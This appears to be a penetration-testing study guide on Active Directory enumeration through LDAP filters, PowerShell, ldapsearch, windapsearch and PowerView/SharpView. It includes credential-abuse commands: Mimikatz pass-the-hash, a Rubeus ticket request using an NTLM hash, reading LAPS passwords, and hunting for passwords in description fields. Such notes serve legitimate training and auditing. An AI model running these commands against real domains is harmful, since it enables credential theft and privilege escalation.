1. Active Directory LDAP

1.1 Active Directory Overview

Active Directory (AD) is a distributed, hierarchical directory service for Windows network environments that provides centralized management of users, computers, groups, network devices, file shares, GPOs, and trusts. It provides authentication and authorization within a Windows domain. Designed for backward compatibility, many features are not "secure by default" and are easily misconfigured.

A basic AD user account with no added privileges can enumerate the majority of objects in AD, including:

Object TypeDescription
Domain ComputersAll machine accounts joined to the domain
Domain UsersAll user accounts in the domain
Domain GroupsGroup membership and nesting
Default Domain PolicyBase GPO applied domain-wide
Domain Functional LevelDetermines available AD features
Password PolicyComplexity, length, lockout thresholds
GPOsGroup Policy Objects and their links
Kerberos DelegationUnconstrained/constrained/RBCD settings
Domain TrustsInter-domain and inter-forest trust relationships
ACLsAccess Control Lists on AD objects

Common attacks that leverage AD misconfigurations include Kerberoasting, ASREPRoasting, NTLM relaying, network traffic poisoning, password spraying, Kerberos delegation abuse, domain trust abuse, credential theft, and object control.

1.2 Active Directory Structure

AD is arranged in a hierarchical tree: forest > domains > OUs > objects. The forest is the security boundary. A domain is a structure within which contained objects are accessible. Organizational Units (OUs) are containers for objects and sub-OUs that allow assignment of different Group Policy Objects.

ComponentDescription
ForestTop-level security boundary; set of trees sharing a schema, global catalog, and configuration
DomainAdministrative unit containing users, computers, groups; defined by DNS namespace
TreeSet of domains sharing a contiguous DNS namespace with transitive two-way trusts
OUContainer for organizing objects; target for GPO application and delegated administration
ObjectMost basic unit - users, computers, groups, printers, shares, GPOs

1.3 Privileged AD Groups

Several built-in groups grant members powerful rights. Membership in these groups is often used to escalate privileges to Domain Admin or SYSTEM on a DC.

GroupAbuse Potential
Default AdministratorsDomain Admins and Enterprise Admins "super" groups
Server OperatorsCan modify services, access SMB shares, backup files
Backup OperatorsCan log on to DCs locally; shadow copy SAM/NTDS, read registry remotely, access DC filesystem via SMB
Print OperatorsCan log on to DCs locally; load malicious printer drivers
Hyper-V AdministratorsFull control over virtual DCs - treat as Domain Admins
Account OperatorsCan modify non-protected accounts and groups
Remote Desktop UsersOften granted RDP login; lateral movement via RDP
Remote Management UsersCan log on to DCs via PSRemoting (WinRM)
Group Policy Creator OwnersCan create GPOs; needs additional permissions to link them
Schema AdminsCan modify the AD schema; can backdoor default object ACLs
DNS AdminsCan load a DLL on a DC; create WPAD records for persistence

Enumerate Schema Admins membership:

PS C:\Users\[user]> Get-ADGroup -Identity "Schema Admins" -Properties *

1.4 User Rights and NT AUTHORITY\SYSTEM

User rights in AD are controlled by group membership and GPO-assigned privileges. The whoami /priv command lists all rights for the current user - rights differ significantly between non-elevated and elevated sessions.

# Non-elevated session
PS C:\Users\[user]> whoami /priv

# Elevated session (shows full rights)
PS C:\Users\[user]> whoami /priv

The NT AUTHORITY\SYSTEM account has the highest OS access level. On a domain-joined host, SYSTEM can enumerate AD by impersonating the computer account. SYSTEM-level access is nearly equivalent to a domain user account - the only real limitation is the inability to perform cross-trust Kerberos attacks such as Kerberoasting.

SYSTEM PrivilegeDefault State
SE_AUDIT_NAMEenabled
SE_CHANGE_NOTIFY_NAMEenabled
SE_CREATE_GLOBAL_NAMEenabled
SE_DEBUG_NAMEenabled
SE_IMPERSONATE_NAMEenabled
SE_INC_BASE_PRIORITY_NAMEenabled
SE_LOCK_MEMORY_NAMEenabled
SE_PROF_SINGLE_PROCESS_NAMEenabled
SE_TCB_NAMEenabled
SE_CREATE_PAGEFILE_NAMEenabled
SE_CREATE_PERMANENT_NAMEenabled
SE_ASSIGNPRIMARYTOKEN_NAMEdisabled
SE_BACKUP_NAMEdisabled
SE_LOAD_DRIVER_NAMEdisabled
SE_MANAGE_VOLUME_NAMEdisabled
SE_RESTORE_NAMEdisabled
SE_SECURITY_NAMEdisabled
SE_SHUTDOWN_NAMEdisabled
SE_TAKE_OWNERSHIP_NAMEdisabled

Ways to gain SYSTEM on a domain-joined host include remote exploits (EternalBlue, BlueKeep), abusing services running as SYSTEM, SeImpersonate abuse (RottenPotatoNG, JuicyPotato, PrintSpoofer), local privilege escalation flaws (Task Scheduler 0day), and PsExec -s.

With SYSTEM on a domain-joined host you can: enumerate domain data with BloodHound/PowerView/SharpView, perform Kerberoasting/ASREPRoasting, run Inveigh for Net-NTLMv2 hashes or relay attacks, perform token impersonation, and carry out ACL attacks.

1.5 RSAT and Domain Context

Remote Server Administration Tools (RSAT) allow remote management of AD from a Windows workstation. The most useful component for enumeration is the PowerShell Active Directory module.

# Check installed RSAT tools
PS C:\Users\[user]> Get-WindowsCapability -Name RSAT* -Online | Select-Object -Property Name, State

# Install all RSAT tools
PS C:\Users\[user]> Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online

# Install a specific RSAT tool
PS C:\Users\[user]> Add-WindowsCapability -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 -Online

To change user context without domain membership, use runas /netonly or pass credentials/hashes to tools like Rubeus and Mimikatz:

# Switch to a different user context (netonly)
C:\Users\[user]> runas /netonly /user:[domain]\[user] powershell

# Open MMC as a domain user from a non-domain-joined host
C:\Users\[user]> runas /netonly /user:Domain_Name\Domain_USER mmc

# Rubeus: request TGT with NTLM hash
C:\Users\[user]> rubeus.exe asktgt /user:[user] /domain:[domain] /dc:[target-ip] /rc4:[ntlm-hash]

# Mimikatz: pass-the-hash to spawn process
C:\Users\[user]> mimikatz.exe sekurlsa::pth /domain:[domain] /user:[user] /rc4:[ntlm-hash]
Note: When using MMC from a non-domain-joined host, add the AD snap-ins, dismiss the domain error, right-click the snap-in, choose "Change Domain", and type the target domain FQDN.

1.6 LDAP Overview

Lightweight Directory Access Protocol (LDAP) is an open-source, cross-platform protocol used for authentication against directory services. LDAP is the language applications use to communicate with directory servers such as AD. The latest specification is version 3 (RFC 4511). An LDAP session begins by connecting to a Directory System Agent (the Domain Controller in AD).

The relationship between AD and LDAP mirrors Apache and HTTP: AD is the directory server; LDAP is the protocol it uses.

1.6.1 LDAP Authentication Methods

TypeDescription
Simple AuthenticationIncludes anonymous, unauthenticated, and username/password BIND requests. Credentials sent in cleartext by default.
SASL AuthenticationSimple Authentication and Security Layer - uses external auth services (e.g., Kerberos) to bind to LDAP. Provides additional security by separating authentication from the protocol.
Note: LDAP authentication messages are sent in cleartext by default. Use TLS/LDAPS (port 636) to protect credentials in transit.

1.7 LDAP Queries

LDAP queries communicate directly with the directory service. Common filter patterns:

FilterMatches
(objectCategory=computer)All workstations/computers
(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))Domain controllers
(&(objectCategory=person)(objectClass=user))All user objects
(objectClass=group)All group objects
 
# List all AD groups via LDAP filter
PS C:\Users\[user]> Get-ADObject -LDAPFilter '(objectClass=group)' | select name

# Find all administratively disabled accounts
PS C:\Users\[user]> Get-ADObject -LDAPFilter '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))' -Properties * | select samaccountname,useraccountcontrol

1.8 PowerShell AD Search Filters

The Filter parameter on AD cmdlets accepts PowerShell comparison operators. Understanding filter syntax enables precise enumeration when automated tools are unavailable.

1.8.1 Filter Operators

OperatorMeaning
-eqEqual to
-neNot equal to
-ltLess than
-gtGreater than
-leLess than or equal to
-geGreater than or equal to
-approxApproximately equal to
-borBitwise OR
-bandBitwise AND
-recursivematchRecursive match (nested group membership)
-likeWildcard match
-notlikeWildcard exclusion
-andBoolean AND
-orBoolean OR
-notBoolean NOT

1.8.2 Characters Requiring Escaping

CharacterEscaped AsNote
"`"Only when data is enclosed in double-quotes
'\'Only when data is enclosed in single quotes
NUL\00Standard LDAP escape sequence
\\5cStandard LDAP escape sequence
*\2aEscaped automatically in -eq and -ne; use -like for wildcards
(/28Escaped automatically
)/29Escaped automatically
//2fEscaped automatically

1.8.3 Filter Examples

# Query installed software (all)
PS C:\Users\[user]> get-ciminstance win32_product | fl

# Filter out Microsoft software
PS C:\Users\[user]> get-ciminstance win32_product -Filter "NOT Vendor like '%Microsoft%'" | fl

# Find user by name (multiple equivalent syntaxes)
Get-ADUser -Filter "name -eq '[user]'"
Get-ADUser -Filter {name -eq '[user]'}
Get-ADUser -Filter 'name -eq "[user]"'

# Find all SQL servers (DNS hostname wildcard)
PS C:\Users\[user]> Get-ADComputer -Filter "DNSHostName -like 'SQL*'"

# Find all protected/admin groups (adminCount=1)
PS C:\Users\[user]> Get-ADGroup -Filter "adminCount -eq 1" | select Name

# Find admin users with DoesNotRequirePreAuth set (AS-REP Roastable)
PS C:\Users\[user]> Get-ADUser -Filter {adminCount -eq '1' -and DoesNotRequirePreAuth -eq 'True'}

# Find admin users with an SPN set (Kerberoastable admins)
PS C:\Users\[user]> Get-ADUser -Filter "adminCount -eq '1'" -Properties * | where servicePrincipalName -ne $null | select SamAccountName,MemberOf,ServicePrincipalName | fl

Methodology

  • Enumerate installed software, filter out Microsoft: 
    get-ciminstance win32_product -Filter "NOT Vendor like '%Microsoft%'" | fl
  • Find SQL servers in the domain: 
    Get-ADComputer -Filter "DNSHostName -like 'SQL*'"
  • Enumerate AdminSDHolder-protected groups: 
    Get-ADGroup -Filter "adminCount -eq 1" | select Name
  • Find ASREPRoastable admin accounts: 
    Get-ADUser -Filter {adminCount -eq '1' -and DoesNotRequirePreAuth -eq 'True'}
  • Find Kerberoastable admin accounts: 
    Get-ADUser -Filter "adminCount -eq '1'" -Properties * | where servicePrincipalName -ne $null | select SamAccountName,MemberOf,ServicePrincipalName | fl

1.9 LDAP Search Filters

The LDAPFilter parameter uses RFC 4515 LDAP search filter syntax. Filters consist of one or more criteria combined with logical operators in Polish Notation (operator precedes operands). Filter rules are enclosed in parentheses.

1.9.1 Logical Operators

OperatorFunctionExample (2 criteria)Example (>2 criteria)
&AND(& (..C1..) (..C2..))(& (..C1..) (..C2..) (..C3..))
|OR(| (..C1..) (..C2..))(| (..C1..) (..C2..) (..C3..))
!NOT(!objectClass=group)N/A

Nested operations: (|(& (..C1..) (..C2..))(& (..C3..) (..C4..))) = (C1 AND C2) OR (C3 AND C4).

1.9.2 Search Criteria Rules

CriteriaRuleExample
Equal to(attribute=123)(&(objectclass=user)(displayName=Smith))
Not equal to(!(attribute=123))(!objectClass=group)
Present(attribute=*)(department=*)
Not present(!(attribute=*))(!homeDirectory=*)
Greater than(attribute>=123)(maxStorage=100000)
Less than(attribute<=123)(maxStorage<=100000)
Approximate match(attribute~=123)(sAMAccountName~=Jason)
Wildcard(attribute=*A)(givenName=*Sam)

1.9.3 Filter Types and Item Types

Filter TypeOperator
Equal to=
Approximately equal to~=
Greater than or equal to>=
Less than or equal to<=
Item TypeSyntax
Simple=
Present=*
Substring=something*
Extensiblevaries depending on type

1.9.4 LDAP Filter Escaped Characters

CharacterHex Representation
*\2a
(\28
)\29
\\5c
NUL\00

1.9.5 Matching Rule OIDs

OIDIdentifierDescription
1.2.840.113556.1.4.803LDAP_MATCHING_RULE_BIT_ANDMatch only if ALL bits from the attribute match the value (bitwise AND)
1.2.840.113556.1.4.804LDAP_MATCHING_RULE_BIT_ORMatch if ANY bits from the attribute match the value (bitwise OR)
1.2.840.113556.1.4.1941LDAP_MATCHING_RULE_IN_CHAINExtended match that walks the chain of ancestry in objects; used for recursive/nested membership queries

1.9.6 LDAP Filter Query Examples

# Find all disabled user accounts (UAC bit 2 = ACCOUNTDISABLE)
PS C:\Users\[user]> Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' | select name

# Find all groups a user belongs to recursively (chain OID)
PS C:\Users\[user]> Get-ADGroup -LDAPFilter '(member:1.2.840.113556.1.4.1941:=CN=[user],OU=[ou-path],DC=[domain],DC=[tld])' | select Name

# Hunt for passwords in description fields
PS C:\Users\[user]> Get-ADUser -Properties * -LDAPFilter '(&(objectCategory=user)(description=*))' | select samaccountname,description

# Kerberoastable users (SPN set, account enabled)
PS C:\Users\[user]> Get-ADUser -LDAPFilter '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' -Properties servicePrincipalName | select SamAccountName,servicePrincipalName

# AS-REP Roastable users (DoesNotRequirePreAuth, UAC bit 4194304)
PS C:\Users\[user]> Get-ADUser -LDAPFilter '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' | select SamAccountName,DistinguishedName

# Unconstrained delegation - users
PS C:\Users\[user]> Get-ADUser -Properties * -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' | select Name,memberof,servicePrincipalName,TrustedForDelegation | fl

# Unconstrained delegation - computers
PS C:\Users\[user]> Get-ADComputer -Properties * -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' | select DistinguishedName,servicePrincipalName,TrustedForDelegation | fl

# Constrained delegation (msDS-AllowedToDelegateTo set)
PS C:\Users\[user]> Get-ADUser -Properties * -LDAPFilter '(msDS-AllowedToDelegateTo=*)' | select SamAccountName,msDS-AllowedToDelegateTo | fl
PS C:\Users\[user]> Get-ADComputer -Properties * -LDAPFilter '(msDS-AllowedToDelegateTo=*)' | select Name,msDS-AllowedToDelegateTo | fl

# Resource-based constrained delegation (msDS-AllowedToActOnBehalfOfOtherIdentity set)
PS C:\Users\[user]> Get-ADComputer -Properties * -LDAPFilter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' | select Name,msDS-AllowedToActOnBehalfOfOtherIdentity | fl

# AdminSDHolder-protected accounts (adminCount=1)
PS C:\Users\[user]> Get-ADUser -LDAPFilter '(&(objectCategory=person)(objectClass=user)(adminCount=1))' -Properties adminCount | select SamAccountName,DistinguishedName

# PASSWD_NOTREQD flag set (blank password possible)
PS C:\Users\[user]> Get-ADUser -LDAPFilter '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))' -Properties * | select name,memberof | fl

# Password never expires (UAC bit 65536 = DONT_EXPIRE_PASSWORD)
PS C:\Users\[user]> Get-ADUser -LDAPFilter '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))' | select SamAccountName,DistinguishedName

# LAPS-managed computers (ms-Mds-AdmPwd attribute present)
PS C:\Users\[user]> Get-ADComputer -LDAPFilter '(ms-Mds-AdmPwd=*)' -Properties ms-Mds-AdmPwd,ms-Mds-AdmPwdExpirationTime | select Name,ms-Mds-AdmPwd,ms-Mds-AdmPwdExpirationTime

# Users with SIDHistory (potential privilege escalation via trust abuse)
PS C:\Users\[user]> Get-ADUser -LDAPFilter '(sIDHistory=*)' -Properties sIDHistory | select SamAccountName,sIDHistory

# Recursive Domain Admins membership (all nested members)
PS C:\Users\[user]> Get-ADUser -LDAPFilter '(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=[domain],DC=[tld])' | select SamAccountName

# All Domain Controllers
PS C:\Users\[user]> Get-ADComputer -LDAPFilter '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))' | select Name,DNSHostName

1.9.7 UAC Bit Reference for LDAP Filters

Bit ValueFlagMeaning
2ACCOUNTDISABLEAccount is disabled
32PASSWD_NOTREQDNo password required
65536DONT_EXPIRE_PASSWORDPassword never expires
524288TRUSTED_FOR_DELEGATIONUnconstrained delegation
4194304DONT_REQ_PREAUTHKerberos pre-auth not required (AS-REP Roastable)
8192SERVER_TRUST_ACCOUNTDomain Controller computer account

Methodology

  • Find disabled accounts: 
    Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' | select name
  • Hunt for passwords in user description fields: 
    Get-ADUser -Properties * -LDAPFilter '(&(objectCategory=user)(description=*))' | select samaccountname,description
  • Find Kerberoastable users (SPN set, enabled): 
    Get-ADUser -LDAPFilter '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' -Properties servicePrincipalName | select SamAccountName,servicePrincipalName
  • Find AS-REP Roastable users (no pre-auth required): 
    Get-ADUser -LDAPFilter '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' | select SamAccountName,DistinguishedName
  • Find users trusted for unconstrained delegation: 
    Get-ADUser -Properties * -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' | select Name,memberof,servicePrincipalName,TrustedForDelegation | fl
  • Find computers trusted for unconstrained delegation: 
    Get-ADComputer -Properties * -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' | select DistinguishedName,servicePrincipalName,TrustedForDelegation | fl
  • Find constrained delegation (users and computers): 
    Get-ADUser -Properties * -LDAPFilter '(msDS-AllowedToDelegateTo=*)' | select SamAccountName,msDS-AllowedToDelegateTo | fl
Get-ADComputer -Properties * -LDAPFilter '(msDS-AllowedToDelegateTo=*)' | select Name,msDS-AllowedToDelegateTo | fl
  • Find resource-based constrained delegation: 
    Get-ADComputer -Properties * -LDAPFilter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' | select Name,msDS-AllowedToActOnBehalfOfOtherIdentity | fl
  • Find admin accounts with PASSWD_NOTREQD (blank password possible): 
    Get-ADUser -LDAPFilter '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))' -Properties * | select name,memberof | fl
  • Find accounts with password never expires: 
    Get-ADUser -LDAPFilter '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))' | select SamAccountName,DistinguishedName
  • Read LAPS passwords from managed computers: 
    Get-ADComputer -LDAPFilter '(ms-Mds-AdmPwd=*)' -Properties ms-Mds-AdmPwd,ms-Mds-AdmPwdExpirationTime | select Name,ms-Mds-AdmPwd,ms-Mds-AdmPwdExpirationTime
  • Find users with SIDHistory (trust abuse vector): 
    Get-ADUser -LDAPFilter '(sIDHistory=*)' -Properties sIDHistory | select SamAccountName,sIDHistory
  • Enumerate all Domain Admins recursively: 
    Get-ADUser -LDAPFilter '(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=[domain],DC=[tld])' | select SamAccountName
  • Enumerate all Domain Controllers: 
    Get-ADComputer -LDAPFilter '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))' | select Name,DNSHostName

1.10 Recursive Match and Nested Group Membership

Nested group membership can grant users effective Domain Admin rights without being a direct member of Domain Admins. The RecursiveMatch parameter and the 1.2.840.113556.1.4.1941 OID both resolve this.

# Get direct group membership (does NOT show nested)
PS C:\Users\[user]> Get-ADUser -Identity [user] -Properties * | select memberof | ft -Wrap

# Get direct members of a group
PS C:\Users\[user]> Get-ADGroupMember -Identity "[group]"

# Find ALL groups a user belongs to (recursively) - Filter parameter
PS C:\Users\[user]> Get-ADGroup -Filter 'member -RecursiveMatch "CN=[user],OU=[ou-path],DC=[domain],DC=[tld]"' | select name

# Find ALL groups a user belongs to (recursively) - LDAPFilter
PS C:\Users\[user]> Get-ADGroup -LDAPFilter '(member:1.2.840.113556.1.4.1941:=CN=[user],OU=[ou-path],DC=[domain],DC=[tld])' | select Name
Note: A user may have derivative Domain Admin rights through nested group membership (e.g., user is in "Security Operations" which is nested inside "Domain Admins"). Standard memberof queries will not reveal this - always use RecursiveMatch or the chain OID.

1.11 SearchBase and SearchScope Parameters

SearchBase scopes queries to a specific OU path (DN format). SearchScope controls depth.

NameLevelDescription
Base0Returns only the object specified as SearchBase itself (use Get-ADObject for OU); returns nothing with Get-ADUser on an OU
OneLevel1Searches only the immediate children of the SearchBase container, not sub-OUs
SubTree2Searches the SearchBase and all child containers recursively (default behavior)
 
# Count all users in a target OU (SubTree default)
PS C:\Users\[user]> (Get-ADUser -SearchBase "OU=[ou],DC=[domain],DC=[tld]" -Filter *).count

# Base scope on OU - returns nothing for Get-ADUser
PS C:\Users\[user]> Get-ADUser -SearchBase "OU=[ou],DC=[domain],DC=[tld]" -SearchScope Base -Filter *

# Base scope with Get-ADObject - returns the OU object itself
PS C:\Users\[user]> Get-ADObject -SearchBase "OU=[ou],DC=[domain],DC=[tld]" -SearchScope Base -Filter *

# OneLevel scope - only direct children of the OU
PS C:\Users\[user]> Get-ADUser -SearchBase "OU=[ou],DC=[domain],DC=[tld]" -SearchScope OneLevel -Filter *

# Numeric value equivalent (1 = OneLevel)
PS C:\Users\[user]> Get-ADUser -SearchBase "OU=[ou],DC=[domain],DC=[tld]" -SearchScope 1 -Filter *

# SubTree scope - all users in all child OUs (same as default)
PS C:\Users\[user]> (Get-ADUser -SearchBase "OU=[ou],DC=[domain],DC=[tld]" -SearchScope Subtree -Filter *).count

1.12 User Account Control (UAC) Attributes

userAccountControl is a bitmask attribute that controls domain account behavior. Many flags have direct security implications.

# Enumerate UAC values for admin accounts
PS C:\Users\[user]> Get-ADUser -Filter {adminCount -gt 0} -Properties admincount,useraccountcontrol | select Name,useraccountcontrol

# Decode a UAC value (e.g., 4260384 = PASSWD_NOTREQD | NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD | DONT_REQ_PREAUTH)
PS C:\Users\[user]> .\Convert-UserAccountControlValues.ps1

# Enumerate UAC flags with PowerView (human-readable flags)
PS C:\Users\[user]> Get-DomainUser * -AdminCount | select samaccountname,useraccountcontrol
Note: Key UAC flags to hunt for: DONT_REQ_PREAUTH (ASREPRoastable), PASSWD_NOTREQD (blank password possible), DONT_EXPIRE_PASSWORD (stale service account passwords), ACCOUNTDISABLE (disabled but may have hash in NTDS).

1.13 Built-in Enumeration Tools

Tools that sysadmins use are often whitelisted and generate less noise. Several built-in Windows tools enumerate AD without requiring third-party tooling.

1.13.1 DS Tools

dsquery and dsget are available by default on modern Windows and require domain connectivity.

# Find users in an OU whose password never expires
C:\Users\[user]> dsquery user "OU=[ou],DC=[domain],DC=[tld]" -name * -scope subtree -limit 0 | dsget user -samid -pwdneverexpires | findstr /V no

1.13.2 AD PowerShell Module

# List all users in a target OU
PS C:\Users\[user]> Get-ADUser -Filter * -SearchBase 'OU=[ou],DC=[domain],DC=[tld]'

1.13.3 Windows Management Instrumentation (WMI)

# List all domain groups via WMI
PS C:\Users\[user]> Get-WmiObject -Class win32_group -Filter "Domain='[DOMAIN]'" | Select Caption,Name

1.13.4 Active Directory Service Interfaces (ADSI)

# Enumerate all computers using ADSI searcher
PS C:\Users\[user]> ([adsisearcher]"(&(objectClass=Computer))").FindAll() | select Path

1.14 LDAP Anonymous Bind

LDAP anonymous bind allows unauthenticated attackers to retrieve domain information when the LDAP server allows it. Linux hosts running open-source LDAP and Linux vCenter appliances are commonly misconfigured this way. Information retrieved can fuel password spraying, ASREPRoasting, or credential discovery in description fields.

1.14.1 Python ldap3 Check

from ldap3 import *
s = Server('[DC-IP]', get_info=ALL)
c = Connection(s, '', '')
c.bind()    # Returns True if anonymous bind succeeds
s.info      # Shows naming contexts, functionality level, etc.

1.14.2 ldapsearch

# Check naming contexts
ldapsearch -x -H ldap://[DC-IP] -s base namingcontexts

# Dump all objects anonymously
ldapsearch -H ldap://[DC-IP] -x -b "DC=[domain],DC=[tld]"

# Pull user accounts (anonymous)
ldapsearch -x -b "DC=[domain],DC=[tld]" -h [DC-IP] -p 389 '(ObjectClass=User)' sAMAccountName | grep sAMAccountName | awk '{print $2}'

# Find service accounts (anonymous)
ldapsearch -x -b "DC=[domain],DC=[tld]" -h [DC-IP] -p 389 | grep -i -a 'Service Accounts'

# Authenticated LDAP search
ldapsearch -H ldap://[DC-IP] -x -D '[user]@[domain]' -w "[password]" -b "DC=[domain],DC=[tld]" "objectclass=user" sAMAccountName | grep sAMAccountName | awk -F":" '{print $2}'

1.14.3 windapsearch

windapsearch is a Python script for anonymous and authenticated LDAP enumeration. It provides built-in query types avoiding the need to craft custom filters.

# Confirm anonymous bind and check domain functionality level
python3 windapsearch.py --dc-ip [DC-IP] -u "" --functionality

# Enumerate all domain users (anonymous)
python3 windapsearch.py --dc-ip [DC-IP] -u "" -U

# Enumerate all domain computers (anonymous)
python3 windapsearch.py --dc-ip [DC-IP] -u "" -C

1.14.4 ldapsearch-ad.py

# Show help / usage
python3 ldapsearch-ad.py -h

# Pull domain info / confirm NULL bind
python3 ldapsearch-ad.py -l [DC-IP] -t info

Methodology

  • Test anonymous LDAP bind with Python: 
    from ldap3 import *
s = Server('[DC-IP]', get_info=ALL)
c = Connection(s, '', '')
c.bind()
  • Check naming contexts and dump objects: 
    ldapsearch -x -H ldap://[DC-IP] -s base namingcontexts
ldapsearch -H ldap://[DC-IP] -x -b "DC=[domain],DC=[tld]"
  • Pull user list for password spraying: 
    python3 windapsearch.py --dc-ip [DC-IP] -u "" -U
  • Enumerate computers anonymously: 
    python3 windapsearch.py --dc-ip [DC-IP] -u "" -C
  • Confirm NULL bind and check functionality level: 
    python3 windapsearch.py --dc-ip [DC-IP] -u "" --functionality
python3 ldapsearch-ad.py -l [DC-IP] -t info

1.15 Credentialed LDAP Enumeration

With valid domain credentials, windapsearch and ldapsearch-ad.py can enumerate users, groups, computers, GPOs, trust relationships, password policies, delegation settings, and Kerberoastable/ASREPRoastable accounts.

1.15.1 windapsearch (Authenticated)

# Enumerate Domain Admins
python3 windapsearch.py --dc-ip [DC-IP] -u [domain]\\[user] --da

# Enumerate users with unconstrained delegation
python3 windapsearch.py --dc-ip [DC-IP] -d [domain] -u [domain]\\[user] --unconstrained-users

1.15.2 ldapsearch-ad.py (Authenticated)

# Get password policy
python3 ldapsearch-ad.py -l [DC-IP] -d [domain] -u [user] -p [password] -t pass-pols

# Find Kerberoastable accounts (SPNs)
python3 ldapsearch-ad.py -l [DC-IP] -d [domain] -u [user] -p [password] -t kerberoast | grep servicePrincipalName:

# Find ASREPRoastable accounts (no pre-auth)
python3 ldapsearch-ad.py -l [DC-IP] -d [domain] -u [user] -p [password] -t asreproast

Methodology

  • Enumerate Domain Admins with credentials: 
    python3 windapsearch.py --dc-ip [DC-IP] -u [domain]\\[user] --da
  • Find users with unconstrained delegation: 
    python3 windapsearch.py --dc-ip [DC-IP] -d [domain] -u [domain]\\[user] --unconstrained-users
  • Pull password policy: 
    python3 ldapsearch-ad.py -l [DC-IP] -d [domain] -u [user] -p [password] -t pass-pols
  • Identify Kerberoastable accounts: 
    python3 ldapsearch-ad.py -l [DC-IP] -d [domain] -u [user] -p [password] -t kerberoast | grep servicePrincipalName:
  • Identify ASREPRoastable accounts: 
    python3 ldapsearch-ad.py -l [DC-IP] -d [domain] -u [user] -p [password] -t asreproast

2. Active Directory PowerView

PowerView and SharpView are the primary tools for AD enumeration in this module. SharpView is a .NET port of PowerView (from the now-deprecated PowerSploit toolkit), trading PowerShell pipeline support for a less security-transparent .NET assembly. Both use identical function names and arguments; output format differs slightly.

Note: SharpView uses strings instead of PowerShell objects, so Select-Object and property piping work only in PowerView, not SharpView.

2.1 Tool Overview & Function Categories

Both tools group their functions into discrete categories. The table below maps each category to its primary use case.

Category Purpose Key Functions
Misc SID conversion, UAC decoding, token impersonation, Kerberoasting ConvertTo-SID, ConvertFrom-UACValue, Invoke-Kerberoast
Domain/LDAP Enumerate users, groups, computers, OUs, GPOs, ACLs, trusts Get-DomainUser, Get-DomainGroup, Get-DomainComputer, Get-DomainObjectAcl
GPO Enumerate and map Group Policy Objects Get-DomainGPO, Get-DomainGPOLocalGroup, Get-DomainPolicy
Computer Enumeration Sessions, local groups, shares, admin access, files Test-AdminAccess, Get-NetShare, Get-NetLocalGroupMember
Threaded Meta Find user locations, shares, local admin access across domain Find-DomainUserLocation, Find-LocalAdminAccess, Find-DomainShare
Domain Trust Enumerate trust relationships and foreign group/user membership Get-DomainTrust, Get-DomainTrustMapping, Get-DomainForeignUser

2.1.1 Misc Functions Reference

Function Description
Export-PowerViewCSVThread-safe CSV append
Resolve-IPAddressResolves a hostname to an IP
ConvertTo-SIDConverts a user/group name to SID
Convert-ADNameConverts object names between formats
ConvertFrom-UACValueConverts UAC int value to human-readable form
Add-RemoteConnectionPseudo-mounts a connection to a remote path
Remove-RemoteConnectionDestroys a connection created by Add-RemoteConnection
Invoke-UserImpersonationCreates a runas /netonly type logon and impersonates the token
Invoke-RevertToSelfReverts any token impersonation
Get-DomainSPNTicketRequests the Kerberos ticket for a specified SPN
Invoke-KerberoastRequests service tickets for Kerberoastable accounts and returns extracted ticket hashes
Get-PathAclGets ACLs for a local/remote file path with optional group recursion

2.2 Enumerating AD Users

Domain users are the primary targets for lateral and vertical movement. Collecting user properties in bulk early in an engagement enables targeted attack planning.

2.2.1 User Count and Help

# Count total domain users
PS C:\Users\[user]> (Get-DomainUser).count

# View all parameters accepted by Get-DomainUser
PS C:\Users\[user]> .\SharpView.exe Get-DomainUser -Help

2.2.2 Key User Properties

# Enumerate key properties for a specific user
PS C:\Users\[user]> Get-DomainUser -Identity [user] -Domain [domain] | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,mail,useraccountcontrol

# Export all users with key properties to CSV for offline analysis
PS C:\Users\[user]> Get-DomainUser * -Domain [domain] | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,mail,useraccountcontrol | Export-Csv .\domain_users.csv -NoTypeInformation

# Export/import users for offline processing
Get-DomainUser | Export-Clixml .\DomainUsers.xml
$DomainUsers = Import-Clixml .\DomainUsers.xml
$DomainUsers | select name
$DomainUsers | ? { $_.name -match "User's Name" }

2.2.3 ASREPRoastable Users

# Find users that do not require Kerberos pre-authentication
PS C:\Users\[user]> .\SharpView.exe Get-DomainUser -KerberosPreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof

2.2.4 Constrained Delegation Users

# Find users trusted to authenticate for other principals (constrained delegation)
PS C:\Users\[user]> .\SharpView.exe Get-DomainUser -TrustedToAuth -Properties samaccountname,useraccountcontrol,memberof

